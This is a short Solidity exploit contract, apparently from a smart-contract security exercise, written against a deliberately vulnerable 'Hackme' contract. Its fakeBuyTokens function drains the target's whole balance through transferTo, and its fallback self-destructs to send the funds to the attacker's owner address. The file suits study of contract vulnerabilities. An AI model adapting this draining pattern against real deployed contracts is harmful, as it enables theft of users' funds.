// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "../src/Vulnerable.sol";

contract Attack {
    
    //pass ether to the contract if you get the revert error
    address owner;
    Hackme public _hackme;
    constructor(address _vulnerable){
        _hackme = Hackme(_vulnerable);
        owner = msg.sender;
     
    }
    function fakeBuyTokens(uint256 amount) public {
        _hackme.transferTo(address(_hackme).balance);
        //transfer everything to the owner
       
    }
    fallback() external payable {
        selfdestruct(payable(owner));
    }



}
